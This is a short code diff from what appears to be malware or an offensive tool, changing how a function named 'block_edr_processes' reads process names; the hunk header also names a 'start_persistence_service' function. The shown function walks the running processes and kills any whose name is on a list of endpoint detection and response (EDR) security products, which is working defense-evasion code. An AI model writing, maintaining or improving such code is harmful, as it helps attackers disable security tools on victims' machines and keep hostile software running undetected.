@@ -81,7 +81,7 @@ def start_persistence_service(service_name):
 def block_edr_processes():
     for proc in psutil.process_iter(['pid', 'name']):
         try:
-            if proc.info['name'] in EDR_PROCESSES:
+            if proc.name() in EDR_PROCESSES:
                 proc.kill()
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             continue
